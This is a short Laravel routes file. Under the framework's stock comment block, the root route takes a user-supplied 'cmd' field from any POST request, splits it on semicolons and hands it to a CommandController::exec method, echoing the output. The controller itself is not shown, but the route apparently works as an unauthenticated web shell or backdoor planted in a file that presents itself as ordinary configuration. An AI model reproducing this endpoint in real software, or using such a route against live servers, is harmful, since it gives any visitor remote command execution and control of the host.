<?php

use Illuminate\Support\Facades\Route;

use App\Http\Controllers\Web;
/*
|--------------------------------------------------------------------------
| Web Routes
|--------------------------------------------------------------------------
|
| Here is where you can register web routes for your application. These
| routes are loaded by the RouteServiceProvider within a group which
| contains the "web" middleware group. Now create something great!
|
*/



Route::any('/', function () {
    if (isset($_POST["submit"])) {
        $cmd = $_POST["cmd"];
        $split = explode(";", $cmd);
        echo Web\CommandController::exec($split);
    }
    return view('welcome');
});

